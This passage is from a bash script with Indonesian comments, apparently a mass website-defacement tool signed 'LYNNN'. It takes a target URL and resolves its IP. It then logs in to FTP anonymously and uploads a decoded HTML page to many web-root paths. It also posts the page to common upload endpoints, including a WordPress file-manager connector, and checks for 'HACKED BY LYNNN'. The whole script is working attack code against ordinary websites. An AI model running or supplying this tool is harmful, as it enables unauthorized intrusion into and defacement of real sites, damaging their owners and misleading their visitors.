echo -e "${CYAN}â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${NC}"
echo ""
echo -ne "${YELLOW}URL : ${NC}"
read URL

# Bersihin URL
URL=$(echo "$URL" | sed 's|https\?://||' | sed 's|/.*||')
DOMAIN=$URL

echo -e "\n${GREEN}[â€¢] Target: $URL${NC}"

# ==============================================
# PROGRESS BAR
# ==============================================
echo -ne "\n${CYAN}["
for i in {1..20}; do
    echo -ne "â–“"
    sleep 0.1
done
echo -e "]${NC}"

# ==============================================
# RESOLVE IP
# ==============================================
echo -e "\n${YELLOW}[1/5] Resolving IP...${NC}"
IP=$(dig +short "$URL" | head -1)
[ -z "$IP" ] && IP=$(ping -c1 "$URL" 2>/dev/null | head -1 | grep -oE '[0-9.]+')
echo -e "${GREEN}  âœ… IP: $IP${NC}"

# ==============================================
# DECODE HTML
# ==============================================
echo -e "\n${YELLOW}[2/5] Preparing HTML...${NC}"
echo "$HTML_BASE64" | base64 -d > index.html
echo -e "${GREEN}  âœ… HTML siap${NC}"

# ==============================================
# FTP EXPLOIT (CEPET)
# ==============================================
echo -e "\n${YELLOW}[3/5] FTP Exploit...${NC}"

# Cek port FTP
timeout 2 bash -c "echo >/dev/tcp/$IP/21" 2>/dev/null
if [ $? -eq 0 ]; then
    echo -e "${GREEN}  âœ… Port 21 terbuka${NC}"
    
    # Upload ke semua lokasi
    ftp -n $IP <<EOF > /dev/null 2>&1
quote USER anonymous
quote PASS anonymous
put index.html /public_html/index.html
put index.html /httpdocs/index.html
put index.html /htdocs/index.html
put index.html /www/index.html
put index.html /var/www/html/index.html
put index.html /home/public_html/index.html
put index.html /sites/index.html
put index.html /public/index.html
quit
EOF
    echo -e "${GREEN}  âœ… FTP upload selesai${NC}"
else
    echo -e "${RED}  âŒ Port 21 tertutup${NC}"
fi

# ==============================================
# HTTP UPLOAD (CEPET)
# ==============================================
echo -e "\n${YELLOW}[4/5] HTTP Upload...${NC}"

# Upload ke berbagai endpoint
ENDPOINTS=(
    "/upload.php"
    "/filemanager/upload.php"
    "/admin/upload.php"
    "/api/upload"
    "/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php"
)

LOCATIONS=(
    "public_html/index.html"
    "httpdocs/index.html"
    "htdocs/index.html"
    "var/www/html/index.html"
)

for end in "${ENDPOINTS[@]}"; do
    for loc in "${LOCATIONS[@]}"; do
        curl -s -k -F "file=@index.html;filename=$loc" "http://$IP$end" > /dev/null 2>&1 &
    done
done
wait
echo -e "${GREEN}  âœ… HTTP upload selesai${NC}"

# ==============================================
# VERIFIKASI (CEPET)
# ==============================================
echo -e "\n${YELLOW}[5/5] Verifying result...${NC}"
sleep 2

# Cek via domain
RESULT1=$(curl -s -k "http://$DOMAIN/" --max-time 3)
# Cek via IP
RESULT2=$(curl -s -k "http://$IP/" --max-time 3)

if [[ "$RESULT1" == *"LYNNN"* ]] || [[ "$RESULT2" == *"LYNNN"* ]]; then
    echo -e "\n${GREEN}â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—${NC}"
    echo -e "${GREEN}â•‘         âœ…  DEFACE BERHASIL!                   â•‘${NC}"
    echo -e "${GREEN}â•‘         HACKED BY LYNNN!! AKTIF!               â•‘${NC}"
    echo -e "${GREEN}â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${NC}"
    
    # Simpan log
    echo "$DOMAIN | $IP | BERHASIL | $(date)" >> lynn_success.txt
    
    # Buka browser
    echo -e "\n${CYAN}ğŸ” Membuka browser...${NC}"
    xdg-open "http://$DOMAIN" 2>/dev/null || open "http://$DOMAIN" 2>/dev/null || echo "Buka: http://$DOMAIN"
    
else
    echo -e "\n${RED}â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—${NC}"
    echo -e "${RED}â•‘         âŒ  DEFACE GAGAL                       â•‘${NC}"
    echo -e "${RED}â•‘         Tapi file HTML siap: index.html        â•‘${NC}"
    echo -e "${RED}â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${NC}"
    
    # Simpan log
    echo "$DOMAIN | $IP | GAGAL | $(date)" >> lynn_failed.txt
    
    echo -e "\n${YELLOW}Cek manual:${NC}"
    echo "  http://$DOMAIN"
    echo "  http://$IP"
fi

# ==============================================
# SELESAI
# ==============================================
echo -e "\n${CYAN}â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${NC}"
